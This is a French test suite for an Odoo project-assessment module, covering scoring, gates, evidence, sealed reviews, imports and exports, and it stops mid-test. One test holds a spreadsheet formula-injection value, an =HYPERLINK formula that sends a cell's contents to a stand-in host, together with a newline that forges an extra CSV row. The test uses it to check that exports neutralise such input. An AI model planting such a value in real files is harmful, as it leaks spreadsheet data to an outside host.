"""Conformité à la méthode MB AxisPro Consulting du prototype de la direction (réf. MBAP/PROJECT-DEVELOPMENT/SC-01) :
formules (scoring.py), puis la méthode dans la plateforme (grille étendue, preuves, gates, comités
scellés, révisions, journal, imports et rapports)."""

import csv
import io
import json
import zipfile
from datetime import date

from odoo.exceptions import UserError
from odoo.tests import TransactionCase, tagged

from odoo.addons.eguitra_api.tests.common import ApiCase
from odoo.addons.eguitra_axispro import scoring

FICHE = {"name": "Centrale solaire", "promoter": "SPV Soleil", "sector": "Énergie", "location": "Kindia"}


def crit(cid, weight=1.0, domain=1, gate=0, **extra):
    return dict({"id": cid, "code": f"C{cid:03d}", "name": f"Critère {cid}", "domain_id": domain, "gate_index": gate,
                 "weight": weight, "critical": False, "knockout": False, "evidence": False, "requirement": "apd",
                 "bankability": True}, **extra)


def run(criteria, statuses, policy=None, documents=(), gates=(), context=None, domains=None, proofs=None, expired=None):
    evaluations = {cid: {"status": status, "has_proof": cid in (proofs or ()), "expired_on": (expired or {}).get(cid)}
                   for cid, status in statuses.items()}
    domains = domains or [{"id": 1, "code": "DOM01", "name": "Marché", "weight": 1.0},
                          {"id": 2, "code": "DOM02", "name": "Juridique", "weight": 1.0}]
    ctx = dict({"fiche": FICHE, "hyp": {}, "investment": 0, "capex_criterion_id": None}, **(context or {}))
    return scoring.compute(policy or {}, criteria, evaluations, domains, list(documents), list(gates), ctx)


def gate(index, rule, **extra):
    return dict({"id": 100 + index, "code": f"G{index}", "name": f"Gate {index}", "index": index, "rule": rule,
                 "hold": None, "go": None, "domain_ids": [], "scope": "global"}, **extra)


@tagged("post_install", "-at_install")
class TestFormules(TransactionCase):
    def test_points_et_non_applicables(self):
        criteria = [crit(1, 2), crit(2), crit(3), crit(4)]
        statuses = {1: "met", 2: "partial", 3: "not_met", 4: "na"}
        r = run(criteria, statuses)
        self.assertAlmostEqual(r["readiness"], (2 * 1 + 0.5) / 4 * 100, msg="Non applicable exclu du calcul")
        self.assertAlmostEqual(r["completeness"], 1 / 3 * 100)
        r = run(criteria, statuses, policy={"exclude_na": False})
        self.assertAlmostEqual(r["readiness"], (2 + 0.5 + 0 + 1) / 5 * 100, msg="Non applicable compté 1 point")

    def test_non_evalue_compte_comme_non_disponible(self):
        r = run([crit(1), crit(2)], {1: "met"})
        self.assertAlmostEqual(r["readiness"], 50.0)
        self.assertEqual(r["assessed"], 1)
        self.assertEqual(r["lines"][1]["status"], "not_met")

    def test_requalification_sans_toucher_la_saisie(self):
        criteria = [crit(1, evidence=True), crit(2, evidence=True), crit(3, evidence=True)]
        r = run(criteria, {1: "met", 2: "met", 3: "met"}, proofs={2, 3}, expired={3: date(2026, 1, 31)})
        lines = {x["id"]: x for x in r["lines"]}
        self.assertEqual((lines[1]["entered"], lines[1]["status"]), ("met", "partial"), "Disponible sans pièce")
        self.assertEqual(lines[2]["status"], "met")
        self.assertEqual(lines[3]["status"], "partial", "Preuve périmée")
        self.assertIn("31/01/2026", lines[3]["alerts"][0])
        self.assertEqual({x["id"] for x in r["requalified"]}, {1, 3})
        self.assertEqual(len(r["anomalies"]), 2)
        r = run(criteria, {1: "met", 2: "met", 3: "met"}, policy={"evidence_check": False, "expiry_check": False})
        self.assertAlmostEqual(r["readiness"], 100.0, msg="Contrôles désactivés par la politique")

    def test_trois_scores(self):
        criteria = [crit(1, 2), crit(2, requirement="closing"), crit(3, bankability=False)]
        r = run(criteria, {1: "met", 2: "not_met", 3: "not_met"})
        self.assertAlmostEqual(r["readiness"], 2 / 4 * 100)
        self.assertAlmostEqual(r["apd"], 2 / 3 * 100, msg="APD Readiness hors DD, SPV, closing")
        self.assertAlmostEqual(r["bankability"], 2 / 3 * 100, msg="Bankability : critères pertinents seulement")

    def test_ponderation_par_domaine(self):
        domains = [{"id": 1, "code": "DOM01", "name": "Marché", "weight": 3.0},
                   {"id": 2, "code": "DOM02", "name": "Juridique", "weight": 1.0}]
        criteria = [crit(1, domain=1), crit(2, domain=2)]
        r = run(criteria, {1: "met", 2: "not_met"}, policy={"weighting": "domain"}, domains=domains)
        self.assertAlmostEqual(r["readiness"], 75.0)
        r = run(criteria, {1: "met", 2: "not_met"}, domains=domains)
        self.assertAlmostEqual(r["readiness"], 50.0, msg="À plat par défaut, comme le prototype")

    def test_knock_out_incomplet(self):
        criteria = [crit(1, knockout=True, critical=True), crit(2, critical=True)]
        r = run(criteria, {1: "partial", 2: "partial"})
        self.assertEqual([x["id"] for x in r["knockouts"]], [1])
        self.assertEqual(r["recommendation"], "no_go")
        self.assertEqual(r["classification"], "CRITICAL / NO-GO")
        self.assertEqual([x["id"] for x in r["critical_missing_excl_ko"]], [2])
        r = run(criteria, {1: "partial", 2: "met"}, policy={"ko_partial_blocks": False})
        self.assertEqual(r["knockouts"], [], "Knock-out incomplet toléré si la politique le prévoit")

    def test_priorite_des_ecarts(self):
        criteria = [crit(1, 2), crit(2, 1, critical=True, knockout=True), crit(3, 2, critical=True), crit(4, 2)]
        r = run(criteria, {1: "not_met", 2: "not_met", 3: "partial", 4: "not_met"})
        self.assertEqual([(g["id"], g["priority"]) for g in r["gaps"]], [(2, 8.0), (1, 2.0), (4, 2.0), (3, 1.5)],
                         "Non disponible : poids + 2 critique + 5 knock-out ; incomplet : moitié de (poids + critique "
                         "+ 3 knock-out) ; égalité dans l'ordre de la grille")

    def test_data_room_par_preuve_rattachee(self):
        documents = [
            {"id": 1, "code": "D001", "name": "Titre foncier", "file_state": "missing", "criterion_ids": [1]},
            {"id": 2, "code": "D002", "name": "Statuts", "file_state": "received", "criterion_ids": []},
            {"id": 3, "code": "D003", "name": "Étude", "file_state": "rejected", "criterion_ids": [2]},
        ]
        r = run([crit(1), crit(2)], {1: "met", 2: "met"}, documents=documents, proofs={1})
        room = {d["code"]: d for d in r["dataroom"]}
        self.assertTrue(room["D001"]["available"])
        self.assertIn("C001", room["D001"]["origin"])
        self.assertTrue(room["D002"]["available"])
        self.assertFalse(room["D003"]["available"], "Pièce à reprendre sans preuve rattachée")
        self.assertAlmostEqual(r["dataroom_completeness"], 2 / 3 * 100)

    def test_regles_des_gates(self):
        criteria = [crit(1, gate=1), crit(2, gate=3, knockout=True), crit(3, gate=4)]
        gates = [gate(0, "intake"), gate(1, "prequalification", hold=30, go=50, scope="cumulative"),
                 gate(3, "apd", hold=65), gate(4, "bankability", hold=80)]
        r = run(criteria, {1: "met"}, gates=gates, context={"fiche": dict(FICHE, sector=None)})
        decisions = {g["code"]: g["decision"] for g in r["gates"]}
        self.assertEqual(decisions["G0"], "hold", "Fiche incomplète")
        self.assertEqual(decisions["G1"], "go", "Portée cumulée : seuls les critères des gates atteints comptent")
        self.assertEqual(decisions["G3"], "no_go", "Zéro knock-out exigé au gate APD")
        self.assertEqual(r["next_gate"]["code"], "G0")
        r = run(criteria, {1: "met", 2: "met", 3: "met"}, gates=gates)
        g4 = next(g for g in r["gates"] if g["code"] == "G4")
        self.assertEqual(g4["decision"], "hold")
        self.assertIn("DSCR non renseigné", g4["motifs"][0])
        r = run(criteria, {1: "met", 2: "met", 3: "met"}, gates=gates, context={"hyp": {"dscr": 1.2}})
        self.assertIn("inférieur au seuil", next(g for g in r["gates"] if g["code"] == "G4")["motifs"][0])
        r = run(criteria, {1: "met", 2: "met", 3: "met"}, gates=gates, context={"hyp": {"dscr": 1.45}})
        self.assertEqual(next(g for g in r["gates"] if g["code"] == "G4")["decision"], "go")
        self.assertEqual(r["recommendation"], "bankable")

        late = [gate(5, "due_diligence"), gate(6, "structuring", domain_ids=[2]), gate(7, "closing")]
        r = run([crit(1, domain=2)], {1: "met"}, gates=late, context={"hyp": {"dd_red_flag": "yes"}})
        self.assertEqual(r["gates"][0]["decision"], "no_go", "Red flag bloquant")
        hyp = {"dd_red_flag": "no", "dataroom_open": "yes", "lenders_agreement": "yes", "cp_lifted": "yes",
               "financing_signed": "yes"}
        documents = [{"id": 1, "code": "D001", "name": "Titre", "file_state": "validated", "criterion_ids": []}]
        r = run([crit(1, domain=2)], {1: "met"}, gates=late, context={"hyp": hyp}, documents=documents)
        self.assertEqual([g["decision"] for g in r["gates"]], ["go", "go", "go"])
        r = run([crit(1, domain=2)], {1: "not_met"}, gates=late, context={"hyp": dict(hyp, cp_lifted="no")},
                documents=documents)
        self.assertEqual([g["decision"] for g in r["gates"]], ["go", "hold", "hold"],
                         "Domaine cible sous 65 et conditions précédentes non levées")

    def test_echelle_de_recommandation(self):
        gates = [gate(3, "apd", hold=65), gate(4, "bankability", hold=80)]
        weights = [crit(i) for i in range(1, 11)]

        def reco(met, partial=0):
            statuses = {i: "met" if i <= met else "partial" if i <= met + partial else "not_met" for i in range(1, 11)}
            return run(weights, statuses, gates=gates, context={"hyp": {"dscr": 1.5}})

        self.assertEqual(reco(10)["recommendation"], "bankable")
        self.assertEqual(reco(7)["recommendation"], "apd_ready")
        self.assertEqual(reco(7)["classification"], "APD READY")
        self.assertEqual(reco(5)["recommendation"], "conditional")
        self.assertEqual(reco(3)["recommendation"], "hold")
        self.assertEqual(reco(3)["classification"], "MAJOR GAPS / HOLD")
        self.assertEqual(reco(2)["recommendation"], "no_go")
        self.assertEqual(reco(8, 2)["classification"], "ADVANCED / BANKABLE CANDIDATE")

    def test_anomalie_capex(self):
        r = run([crit(1)], {1: "not_met"}, context={"investment": 1_000_000, "capex_criterion_id": 1})
        self.assertIn("investissement", r["anomalies"][0])


def extended_grid():
    """Grille au format MB AxisPro Consulting (colonne « exigence ») : huit gates, deux domaines, cinq critères."""
    header = ("type", "code", "libelle", "domaine", "gate", "poids", "critique", "eliminatoire", "preuve", "aide",
              "exigence", "bancabilite", "livrable", "role", "regle", "seuil_attente", "seuil_go", "portee", "domaines",
              "criteres")
    rows = [
        {"type": "gate", "code": "G0", "libelle": "Project Intake", "regle": "intake", "livrable": "Fiche d'enregistrement"},
        {"type": "gate", "code": "G1", "libelle": "Prequalification", "regle": "prequalification", "seuil_attente": "30",
         "seuil_go": "50", "portee": "cumulee"},
        {"type": "gate", "code": "G2", "libelle": "Pre-feasibility", "regle": "feasibility", "seuil_attente": "40",
         "portee": "cumulee", "domaines": "DOM01"},
        {"type": "gate", "code": "G3", "libelle": "APD Readiness", "regle": "apd", "seuil_attente": "65"},
        {"type": "gate", "code": "G4", "libelle": "Bankability", "regle": "bankability", "seuil_attente": "80"},
        {"type": "gate", "code": "G5", "libelle": "Due diligence", "regle": "due_diligence", "seuil_attente": "80"},
        {"type": "gate", "code": "G6", "libelle": "Structuring", "regle": "structuring", "seuil_attente": "65",
         "domaines": "DOM02"},
        {"type": "gate", "code": "G7", "libelle": "Financial close", "regle": "closing"},
        {"type": "domaine", "code": "DOM01", "libelle": "Marché et technique", "poids": "1",
         "livrable": "Étude de marché à commander"},
        {"type": "domaine", "code": "DOM02", "libelle": "Juridique et foncier", "poids": "1"},
        {"type": "critere", "code": "C001", "libelle": "Étude de marché", "domaine": "DOM01", "gate": "G1", "poids": "2",
         "critique": "oui", "exigence": "apd", "bancabilite": "oui"},
        {"type": "critere", "code": "C002", "libelle": "Foncier sécurisé", "domaine": "DOM02", "gate": "G1", "poids": "1",
         "critique": "oui", "eliminatoire": "oui", "preuve": "oui", "exigence": "bloquant", "bancabilite": "oui"},
        {"type": "critere", "code": "C003", "libelle": "CAPEX détaillé", "domaine": "DOM01", "gate": "G2", "poids": "2",
         "exigence": "apd", "bancabilite": "oui", "livrable": "Devis des fournisseurs", "role": "capex"},
        {"type": "critere", "code": "C004", "libelle": "Pacte d'actionnaires", "domaine": "DOM02", "gate": "G6",
         "poids": "1", "exigence": "closing", "bancabilite": "non"},
        {"type": "critere", "code": "C005", "libelle": "Étude d'impact", "domaine": "DOM02", "gate": "G3", "poids": "1",
         "exigence": "apd", "bancabilite": "oui"},
        {"type": "piece", "code": "D001", "libelle": "Titre foncier", "domaine": "A. Foncier", "gate": "G1",
         "critique": "oui", "criteres": "C002"},
        {"type": "piece", "code": "D002", "libelle": "Étude de marché", "domaine": "B. Marché", "gate": "G1",
         "critique": "oui", "criteres": "C001"},
        {"type": "piece", "code": "D003", "libelle": "Pacte signé", "domaine": "C. Structuration", "gate": "G6",
         "criteres": "C004"},
    ]
    lines = [";".join(header)] + [";".join(row.get(h, "") for h in header) for row in rows]
    return ("\n".join(lines) + "\n").encode()


@tagged("post_install", "-at_install")
class TestMethodeDansLaPlateforme(ApiCase):
    @classmethod
    def setUpClass(cls):
        super().setUpClass()
        cls.cabinet = cls.env["res.company"].search([("eguitra_entity", "=", "cabinet")], limit=1)
        cls.env = cls.env(context=dict(cls.env.context, allowed_company_ids=cls.cabinet.ids))
        cls.policy = cls.env["axispro.policy"].import_grid(cls.cabinet, "Méthode MB AxisPro Consulting", "grille.csv",
                                                          extended_grid())
        cls.policy.action_activate()
        cls.promoter = cls.env["res.partner"].create({"name": "SPV Soleil"})
        cls._create_user("analyste", "cabinet", company_id=cls.cabinet.id, company_ids=[(6, 0, cls.cabinet.ids)])
        # Second consultant : verrouille, force ou rouvre à la place de l'auteur (quatre yeux).
        cls._create_user("relecteur", "cabinet", company_id=cls.cabinet.id, company_ids=[(6, 0, cls.cabinet.ids)])

    def setUp(self):
        super().setUp()
        self.dossier = self.env["axispro.dossier"].create({
            "name": "Centrale solaire", "promoter_id": self.promoter.id, "company_id": self.cabinet.id,
            "sector": "Énergie", "location": "Kindia",
        })
        self.token = self.open_session("analyste", app="axispro")["access_token"]
        self.evals = {e.criterion_id.code: e for e in self.dossier.evaluation_ids}

    def _upload(self, path, name="preuve.pdf", data=None):
        return self.url_open(f"/api/v1{path}", files={"file": (name, io.BytesIO(b"%PDF-1.4 " + name.encode()),
                                                                "application/pdf")},
                             data=data or {}, headers={"Authorization": f"Bearer {self.token}"}, method="POST",
                             timeout=60)

    def _relecteur(self):
        return self.open_session("relecteur", app="axispro")["access_token"]

    def test_grille_etendue(self):
        p = self.policy
        self.assertEqual((p.weighting, p.go_threshold), ("flat", 65.0), "Format MB AxisPro Consulting : à plat, APD READY à 65")
        gates = {g.code: g for g in p.gate_ids}
        self.assertEqual((gates["G1"].rule_code, gates["G1"].threshold_hold, gates["G1"].threshold_go,
                          gates["G1"].score_scope), ("prequalification", 30.0, 50.0, "cumulative"))
        self.assertEqual(gates["G2"].domain_ids.mapped("code"), ["DOM01"])
        self.assertEqual(p.capex_criterion_id.code, "C003")
        criteria = {c.code: c for c in p.criterion_ids}
        self.assertEqual((criteria["C002"].requirement_type, criteria["C002"].evidence_required), ("blocking", True))
        self.assertFalse(criteria["C004"].bankability)
        self.assertEqual(criteria["C003"].default_deliverable(), "Devis des fournisseurs")
        self.assertEqual(criteria["C001"].default_deliverable(), "Étude de marché à commander", "Livrable du domaine")
        piece = p.document_type_ids.filtered(lambda t: t.code == "D001")
        self.assertEqual(piece.criterion_ids.mapped("code"), ["C002"])
        integrity = p.integrity()
        self.assertEqual((integrity["criteria"], integrity["gates"], integrity["links"]), (5, 8, 3))
        status, body = self.call("PATCH", f"/axispro/policies/{p.id}", {"threshold_hold": 40}, token=self.token)
        self.assertEqual(status, 422, "Une version en vigueur ne se modifie pas")
        draft = p.copy_as_new_version()
        self.assertEqual(draft.gate_ids.filtered(lambda g: g.code == "G2").domain_ids.mapped("code"), ["DOM01"])
        self.assertEqual(draft.capex_criterion_id.code, "C003")
        status, body = self.call("PATCH", f"/axispro/policies/{draft.id}", {"conditional_threshold": 90},
                                 token=self.token)
        self.assertEqual(status, 422, "Seuils dans l'ordre")
        status, body = self.call("PATCH", f"/axispro/policies/{draft.id}",
                                 {"threshold_hold": 35, "weighting": "domain", "ko_partial_blocks": False},
                                 token=self.token)
        self.assertEqual((status, body["threshold_hold"], body["weighting"], body["ko_partial_blocks"]),
                         (200, 35.0, "domain", False), body)
        g1 = draft.gate_ids.filtered(lambda g: g.code == "G1")
        status, body = self.call("PATCH", f"/axispro/gates/{g1.id}", {"rule_code": "inconnue"}, token=self.token)
        self.assertEqual(status, 400)
        status, body = self.call("PATCH", f"/axispro/gates/{g1.id}", {"threshold_go": 55, "score_scope": "global"},
                                 token=self.token)
        self.assertEqual(status, 200, body)
        self.env.invalidate_all()
        self.assertEqual((g1.threshold_go, g1.score_scope), (55.0, "global"))

    def test_preuve_deposee_sur_le_critere(self):
        c002 = self.evals["C002"]
        status, body = self.call("PATCH", f"/axispro/evaluations/{c002.id}",
                                 {"status": "met", "responsible": "Promoteur", "due_date": "2026-11-30"}, token=self.token)
        self.assertEqual(status, 200, body)
        status, rows = self.call("GET", f"/axispro/dossiers/{self.dossier.id}/criteria", token=self.token)
        row = next(r for r in rows if r["code"] == "C002")
        self.assertEqual((row["status"], row["retained"]), ("met", "partial"), "Knock-out sans preuve requalifié")
        self.assertTrue(row["alerts"])
        self.assertEqual(row["pieces"][0]["code"], "D001")
        self.assertEqual(body["scoring"]["knockouts"][0]["code"], "C002")

        response = self._upload(f"/axispro/evaluations/{c002.id}/evidence", "titre_foncier.pdf",
                                {"validity_date": "2030-12-31"})
        self.assertEqual(response.status_code, 200, response.text)
        result = response.json()
        self.assertEqual(result["document"]["validity_date"], "2030-12-31")
        self.assertNotIn("C002", [k["code"] for k in result["scoring"]["knockouts"]])
        self.env.invalidate_all()
        doc = self.env["axispro.document"].browse(result["document"]["id"])
        self.assertEqual(doc.document_type_id.code, "D001", "Pièce standard unique rattachée au critère")
        status, room = self.call("GET", f"/axispro/dossiers/{self.dossier.id}/documents", token=self.token)
        d001 = next(d for d in room["standard"] if d["code"] == "D001")
        self.assertTrue(d001["available"])

        self.evals["C001"].document_ids = [(4, doc.id)]
        room = {d["code"]: d for d in self.dossier.documents_status()}
        self.assertTrue(room["D002"]["available"], "Pièce disponible par la preuve d'un critère rattaché")
        self.assertIn("C001", room["D002"]["origin"])

        status, journal = self.call("GET", f"/axispro/dossiers/{self.dossier.id}/journal", token=self.token)
        self.assertEqual(status, 200, journal)
        kinds = [j["kind"] for j in journal]
        self.assertIn("status", kinds)
        self.assertIn("document", kinds)
        entry = next(j for j in journal if j["kind"] == "status")
        self.assertEqual((entry["criterion"], entry["before"], entry["after"]),
                         ("C002", "Non évalué", "Disponible et exploitable"))

    def test_passage_de_gate_motive_ou_force(self):
        self.assertEqual(self.dossier.current_gate_id.code, "G0")
        self.dossier.action_advance_gate()
        self.assertEqual(self.dossier.current_gate_id.code, "G1", "Fiche complète : recevable")
        # Quatre yeux : un autre consultant a contribué à la révision, l'analyste peut forcer.
        status, body = self.call("PATCH", f"/axispro/evaluations/{self.evals['C002'].id}", {"status": "not_met"},
                                 token=self._relecteur())
        self.assertEqual(status, 200, body)
        with self.assertRaises(UserError):
            self.dossier.action_advance_gate()
        status, body = self.call("POST", f"/axispro/dossiers/{self.dossier.id}/advance-gate", {"force_reason": "court"},
                                 token=self.token)
        self.assertEqual(status, 400)
        status, body = self.call("POST", f"/axispro/dossiers/{self.dossier.id}/advance-gate",
                                 {"force_reason": "Titre foncier attendu du ministère, décision du comité du 12/10"},
                                 token=self.token)
        self.assertEqual((status, body["current_gate"]["code"]), (200, "G2"), body)
        self.env.invalidate_all()
        note = self.dossier.journal_ids.filtered(lambda j: j.kind == "gate")[:1].note
        self.assertIn("Passage forcé de G1 à G2", note)

    def test_recommandation_a_completer_puis_calculee(self):
        self.assertEqual(self.dossier.scoring()["recommendation"], "pending")
        self.dossier.action_advance_gate()
        self.evals["C001"].status = "met"
        score = self.dossier.scoring()
        self.assertEqual(score["recommendation"], "pending", "Critère du gate atteint encore à évaluer")
        self.assertEqual(score["knockouts_pending"], 1)
        self.evals["C002"].status = "not_met"
        score = self.dossier.scoring()
        self.assertEqual(score["recommendation"], "no_go")
        self.assertAlmostEqual(score["readiness"], 2 / 7 * 100)
        self.assertAlmostEqual(score["apd"], 2 / 6 * 100)
        self.assertEqual([g["criterion_id"] for g in self.dossier.gaps(1)], [self.evals["C002"].criterion_id.id])

    def test_decision_scellee_et_revision(self):
        # Quatre yeux : le relecteur évalue, l'analyste verrouille.
        relecteur = self._relecteur()
        for code in ("C001", "C003", "C005"):
            status, body = self.call("PATCH", f"/axispro/evaluations/{self.evals[code].id}", {"status": "met"},
                                     token=relecteur)
            self.assertEqual(status, 200, body)
        status, body = self.call("POST", f"/axispro/dossiers/{self.dossier.id}/reviews",
                                 {"decision": "hold", "lock": True}, token=self.token)
        self.assertEqual(status, 400, "HOLD verrouillé sans motif refusé")
        status, review = self.call("POST", f"/axispro/dossiers/{self.dossier.id}/reviews",
                                   {"decision": "hold", "instance": "Comité d'investissement", "lock": True,
                                    "motive": "Titre foncier à produire", "members": "DG, DGA"}, token=self.token)
        self.assertEqual(status, 200, review)
        self.assertEqual((review["state"], review["revision"], len(review["fingerprint"])), ("locked", 1, 64))
        status, check = self.call("GET", f"/axispro/reviews/{review['id']}/verify", token=self.token)
        self.assertEqual(check, {"sealed": True, "intact": True, "unchanged": True, "fingerprint": review["fingerprint"]})
        status, body = self.call("PATCH", f"/axispro/dossiers/{self.dossier.id}", {"investment": 5_000_000},
                                 token=self.token)
        self.assertEqual(status, 422, "Fiche figée par la décision verrouillée")
        status, body = self.call("PATCH", f"/axispro/evaluations/{self.evals['C002'].id}", {"status": "met"},
                                 token=self.token)
        self.assertEqual(status, 422, "Évaluation figée")
        status, detail = self.call("GET", f"/axispro/dossiers/{self.dossier.id}", token=self.token)
        self.assertEqual((detail["locked"], detail["decision"], detail["locked_review"]["id"]), (True, "hold", review["id"]))

        self.env.invalidate_all()
        record = self.env["axispro.review"].browse(review["id"])
        self.env.cr.execute("UPDATE axispro_review SET sealed_content = jsonb_set(sealed_content::jsonb, "
                            "'{decision,decision}', '\"go\"') WHERE id = %s", (record.id,))
        record.invalidate_recordset(["sealed_content"])
        self.assertFalse(record.verify()["intact"], "Contenu scellé modifié : empreinte invalide")

        # Quatre yeux : la révision qui défait le verrou s'ouvre par un autre compte que celui qui a verrouillé.
        status, body = self.call("POST", f"/axispro/dossiers/{self.dossier.id}/new-revision", token=relecteur)
        self.assertEqual((status, body["revision"], body["locked"]), (200, 2, False), body)
        status, body = self.call("PATCH", f"/axispro/dossiers/{self.dossier.id}", {"investment": 5_000_000},
                                 token=self.token)
        self.assertEqual(status, 200, body)
        self.env.invalidate_all()
        kinds = self.dossier.journal_ids.mapped("kind")
        self.assertIn("decision", kinds)
        self.assertIn("revision", kinds)
        self.evals["C003"].status = "not_met"
        self.assertIn("investissement", " ".join(self.dossier.scoring()["anomalies"]),
                      "Investissement saisi alors que le CAPEX détaillé est non disponible")

    def test_fiche_d_evaluation_export_import(self):
        response = self.url_open(f"/api/v1/axispro/dossiers/{self.dossier.id}/evaluation.xlsx",
                                 headers={"Authorization": f"Bearer {self.token}"}, timeout=60)
        self.assertEqual(response.status_code, 200)
        self.assertTrue(response.content.startswith(b"PK"))
        sheet = ("code;statut;observation;echeance\nC001;Disponible et exploitable;Étude reçue;2026-12-15\n"
                 "C003;0,5;;\nC999;1;;\n").encode()

        def send(content, name="fiche.csv", dry=False):
            return self.url_open(f"/api/v1/axispro/dossiers/{self.dossier.id}/evaluation/import",
                                 files={"file": (name, io.BytesIO(content), "text/csv")},
                                 data={"dry_run": "1"} if dry else {},
                                 headers={"Authorization": f"Bearer {self.token}"}, method="POST", timeout=60).json()

        preview = send(sheet, dry=True)
        self.assertEqual((preview["applied"], len(preview["changes"]), preview["unknown"]), (False, 2, ["C999"]))
        self.env.invalidate_all()
        self.assertEqual(self.evals["C001"].status, "not_assessed", "Aperçu sans effet")
        result = send(sheet)
        self.assertTrue(result["applied"], result)
        self.env.invalidate_all()
        self.assertEqual((self.evals["C001"].status, self.evals["C001"].comment, self.evals["C003"].status),
                         ("met", "Étude reçue", "partial"))
        self.assertEqual(self.evals["C001"].due_date, date(2026, 12, 15))
        bad = send(b"code;statut\nC002;peut-etre\n")
        self.assertFalse(bad["applied"])
        self.assertIn("inconnu", bad["errors"][0])
        by_label = send("Critère / pièce;Statut saisi\nPacte d’actionnaires;Non applicable\n".encode())
        self.assertTrue(by_label["applied"], by_label)
        self.env.invalidate_all()
        self.assertEqual(self.evals["C004"].status, "na", "Rapprochement par intitulé, comme le classeur du cabinet")

        response = self.url_open(f"/api/v1/axispro/dossiers/{self.dossier.id}/export.json",
                                 headers={"Authorization": f"Bearer {self.token}"}, timeout=60)
        exported = response.json()
        self.assertEqual((exported["format"], len(exported["evaluations"])), ("axispro-dossier", 5))
        other = self.env["axispro.dossier"].create({"name": "Copie", "promoter_id": self.promoter.id,
                                                     "company_id": self.cabinet.id})
        response = self.url_open(f"/api/v1/axispro/dossiers/{other.id}/evaluation/import",
                                 files={"file": ("export.json", io.BytesIO(json.dumps(exported).encode()),
                                                 "application/json")},
                                 headers={"Authorization": f"Bearer {self.token}"}, method="POST", timeout=60)
        self.assertTrue(response.json()["applied"], response.text)
        self.env.invalidate_all()
        copied = {e.criterion_id.code: e.status for e in other.evaluation_ids}
        self.assertEqual((copied["C001"], copied["C003"]), ("met", "partial"))
        self.assertIn("import", other.journal_ids.mapped("kind"))

    def test_rapports_et_data_room(self):
        self.evals["C001"].status = "met"
        self._upload(f"/axispro/evaluations/{self.evals['C002'].id}/evidence", "titre.pdf")
        headers = {"Authorization": f"Bearer {self.token}"}
        for path, start in (("report.xlsx", b"PK"), ("dataroom.zip", b"PK")):
            response = self.url_open(f"/api/v1/axispro/dossiers/{self.dossier.id}/{path}", headers=headers, timeout=60)
            self.assertEqual(response.status_code, 200, path)
            self.assertTrue(response.content.startswith(start), path)
        archive = zipfile.ZipFile(io.BytesIO(response.content))
        self.assertIn("SOMMAIRE.csv", archive.namelist())
        self.assertTrue(any(n.startswith("A. Foncier/D001_") for n in archive.namelist()), archive.namelist())
        # En test, le noyau rend les rapports en HTML (sans wkhtmltopdf) : le gabarit est exercé.
        for path, text in (("report.pdf", "Recommandation"), ("pieces.pdf", "Pièces attendues")):
            response = self.url_open(f"/api/v1/axispro/dossiers/{self.dossier.id}/{path}", headers=headers, timeout=60)
            self.assertEqual(response.status_code, 200, response.text[:500])
            self.assertIn(text, response.content.decode(errors="ignore"), path)
        status, report = self.call("GET", f"/axispro/dossiers/{self.dossier.id}/report", token=self.token)
        self.assertEqual(status, 200, report)
        self.assertEqual(len(report["dossier"]["scoring"]["gates"]), 8)

        porteur = self._create_user("porteur.soleil", "porteur", company_id=self.cabinet.id,
                                    company_ids=[(6, 0, self.cabinet.ids)])
        self.dossier.portal_user_ids = [(4, porteur.id)]
        ptoken = self.open_session("porteur.soleil", app="portail")["access_token"]
        response = self.url_open(f"/api/v1/portail/dossiers/{self.dossier.id}/pieces.pdf",
                                 headers={"Authorization": f"Bearer {ptoken}"}, timeout=60)
        self.assertEqual(response.status_code, 200, response.text[:500])

    # ─── Corrections de la revue de code ──────────────────────────────────

    def test_classeur_avec_preuves_datees_et_non_datees(self):
        evidence = f"/axispro/evaluations/{self.evals['C002'].id}/evidence"
        self.assertEqual(self._upload(evidence, "titre.pdf", {"validity_date": "2030-12-31"}).status_code, 200)
        self.assertEqual(self._upload(evidence, "plan_cadastral.pdf").status_code, 200)
        response = self.url_open(f"/api/v1/axispro/dossiers/{self.dossier.id}/report.xlsx",
                                 headers={"Authorization": f"Bearer {self.token}"}, timeout=60)
        self.assertEqual(response.status_code, 200, response.text[:300])
        self.assertTrue(response.content.startswith(b"PK"))

    def test_sommaire_de_la_data_room_sans_formule(self):
        response = self._upload(f"/axispro/dossiers/{self.dossier.id}/documents", "libre.pdf",
                                {"name": '=HYPERLINK("http://exemple.test/?"&B2;"ouvrir")\nFausse ligne;1'})
        self.assertEqual(response.status_code, 200, response.text)
        self.assertNotIn("\n", response.json()["name"], "Nom ramené à une ligne")
        response = self.url_open(f"/api/v1/axispro/dossiers/{self.dossier.id}/dataroom.zip",
                                 headers={"Authorization": f"Bearer {self.token}"}, timeout=60)
        summary = zipfile.ZipFile(io.BytesIO(response.content)).read("SOMMAIRE.csv").decode("utf-8-sig")
        rows = list(csv.reader(io.StringIO(summary), delimiter=";"))
        self.assertEqual(len(rows), 2, "En-tête et une pièce, sans ligne ajoutée par le nom")
        self.assertTrue(rows[1][1].startswith("'="), "Formule neutralisée")

    def test_portail_sans_structure_de_la_grille(self):
        self._upload(f"/axispro/evaluations/{self.evals['C002'].id}/evidence", "titre.pdf")
        porteur = self._create_user("porteur.grille", "porteur", company_id=self.cabinet.id,
                                    company_ids=[(6, 0, self.cabinet.ids)])
        self.dossier.portal_user_ids = [(4, porteur.id)]
        ptoken = self.open_session("porteur.grille", app="portail")["access_token"]
        status, view = self.call("GET", f"/portail/dossiers/{self.dossier.id}", token=ptoken)
        self.assertEqual(status, 200, view)
        self.assertTrue(view["documents"])
        for doc in view["documents"]:
            self.assertFalse({"criteria", "origin", "available"} & set(doc), doc)
        status, files = self.call("GET", f"/portail/dossiers/{self.dossier.id}/documents", token=ptoken)
        self.assertEqual(status, 200, files)
        self.assertTrue(all("criteria" not in f for f in files), files)

    def test_grille_aux_valeurs_illisibles_refusee(self):
        head = "type;code;libelle;domaine;gate;poids;critique;eliminatoire;preuve;aide\n"
        base = "gate;G0;Idée;;;;;;;\ndomaine;D01;Marché;;;1;;;;\n"
        cases = {
            "éliminatoire illisible": "critere;C001;Étude;D01;G0;1;non;peut-être;non;\n",
            "poids négatif": "critere;C001;Étude;D01;G0;-1;non;non;non;\n",
            "poids illisible": "critere;C001;Étude;D01;G0;2,5 pts;non;non;non;\n",
            "code en double": "critere;C001;Étude;D01;G0;1;non;non;non;\ncritere;C001;Autre;D01;G0;1;non;non;non;\n",
            "type inconnu": "criteres;C001;Étude;D01;G0;1;non;non;non;\n",
        }
        for label, rows in cases.items():
            with self.subTest(label), self.assertRaises(UserError):
